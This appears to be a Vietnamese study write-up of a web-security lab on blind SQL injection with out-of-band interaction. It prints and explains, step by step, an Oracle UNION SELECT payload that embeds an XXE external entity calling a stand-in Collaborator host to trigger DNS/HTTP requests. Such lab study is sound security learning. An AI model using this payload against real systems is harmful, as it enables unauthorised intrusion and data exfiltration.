<h1>Blind SQL injection with out-of-band interaction</h1>
<p>Bài này dùng Burp Collaborator (pro) nên tui sẽ chỉ paste lí thuyết.</p>
⭐ MỤC TIÊU CỦA PAYLOAD

Mục tiêu rất đơn giản:

Ép database + XML parser thực hiện một request (DNS/HTTP) đến Burp Collaborator.

Chỉ cần thấy request xuất hiện → bạn thắng.

Payload trong đề là:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--


Nghe dài, nhưng thật ra chỉ gồm 3 phần:

1. Phần SQL Injection để thoát và UNION SELECT
x' + UNION SELECT ...


Giải thích:

x' → đóng chuỗi trong SQL (')

sau đó dùng UNION SELECT để inject thêm một query vào

Oracle chỉ cho SELECT từ bảng → dùng FROM dual

=> Phần này tạo chỗ để bạn chạy lệnh XML.

2. Phần XML + XXE để ép tải external entity
EXTRACTVALUE(
  xmltype('<xml ... <!DOCTYPE ... SYSTEM "http://BURP" ...>'),
  '/l'
)


Giải thích đơn giản:

❗ xmltype('<...>')

Tạo một đối tượng XML từ chuỗi bạn cung cấp.

❗ Bên trong XML, bạn đặt XXE:
<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/">
%remote;


Giải thích như người mới:

<!ENTITY % remote SYSTEM "http://.../">
→ định nghĩa một entity từ URL bên ngoài

%remote;
→ bảo XML parser tải entity đó

Khi parser tải entity %remote, nó phải gửi request đến:

http://BURP-COLLABORATOR-SUBDOMAIN/


→ Hệ thống DNS/HTTP sẽ đi ra ngoài → Collaborator sẽ nhận request → bạn thấy request → chứng minh payload chạy.

❗ EXTRACTVALUE(...,'/l')

ép XML parser phải parse XML (bắt buộc xử lý XXE)

path /l không quan trọng, chỉ để gọi parser

=> Kết quả return của EXTRACTVALUE không quan trọng.
=> Quan trọng là trong quá trình parse → request Collaborator được gửi.

3. Đóng payload
-- 


→ comment phần còn lại của query → tránh lỗi.

⭐ CÁCH ĐƠN GIẢN ĐỂ NHỚ PAYLOAD NÀY

Payload gồm 3 bước:

(1) SQLi: thoát chuỗi, UNION SELECT → tạo chỗ để chạy lệnh

(2) XXE trong EXTRACTVALUE() → ép XML parser tải entity từ URL

(3) Burp Collaborator tự động bắt request

Vậy bản chất:

Dùng SQL injection để nhét một XML, và trong XML chứa XXE, và XXE gọi ra Collaborator.

⭐ Vì sao Oracle phải dùng EXTRACTVALUE()?

Oracle không cho bạn gọi trực tiếp URL từ SQL như SQL Server.
Nhưng Oracle XML parser thì có thể load external DTD.

Nên ta lách như sau:

SQLi → gọi XML parser → XML parser → load external entity → gửi DNS lookup.

⭐ LÀM THẾ NÀO THAY VÀO BURP COLLABORATOR? (quan trọng khi dựng payload)

Trong Burp Suite:

Chuột phải vào chỗ "http%3a//BURP-COLLABORATOR-SUBDOMAIN/"

Chọn: Insert Collaborator payload

Burp tự chèn 1 subdomain dạng:

abc123xyz.burpcollaborator.net


Khi payload chạy → bạn thấy DNS/HTTP lookup trong Collaborator.
